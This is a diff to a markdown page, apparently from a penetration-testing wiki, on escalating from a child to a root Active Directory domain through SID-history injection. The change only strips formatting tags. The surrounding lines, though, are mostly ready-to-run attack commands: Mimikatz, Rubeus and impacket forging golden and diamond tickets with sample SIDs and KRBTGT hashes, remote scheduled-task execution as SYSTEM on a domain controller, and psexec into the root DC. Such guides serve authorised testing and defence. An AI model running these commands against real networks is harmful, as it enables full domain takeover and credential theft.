@@ -30,7 +30,7 @@ Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSi
 
 ### Golden Ticket (Mimikatz) with KRBTGT-AES256
 
-{% code overflow="wrap" %}
+
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -47,7 +47,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-{% endcode %}
+
 
 For more info about golden tickets check:
 
@@ -57,7 +57,7 @@ For more info about golden tickets check:
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-{% code overflow="wrap" %}
+
 ```powershell
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
@@ -67,7 +67,7 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 
 # You can use "Administrator" as username or any other string
 ```
-{% endcode %}
+
 
 For more info about diamond tickets check:
 
@@ -75,17 +75,17 @@ For more info about diamond tickets check:
 [diamond-ticket.md](diamond-ticket.md)
 
 
-{% code overflow="wrap" %}
+
 ```bash
 .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local 
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-{% endcode %}
+
 
 Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
 
-{% code overflow="wrap" %}
+
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -97,7 +97,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-{% endcode %}
+
 
 With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
 
@@ -109,7 +109,7 @@ With the acquired permissions from the attack you can execute for example a DCSy
 
 #### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 
-{% code overflow="wrap" %}
+
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -129,7 +129,7 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-{% endcode %}
+
 
 #### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
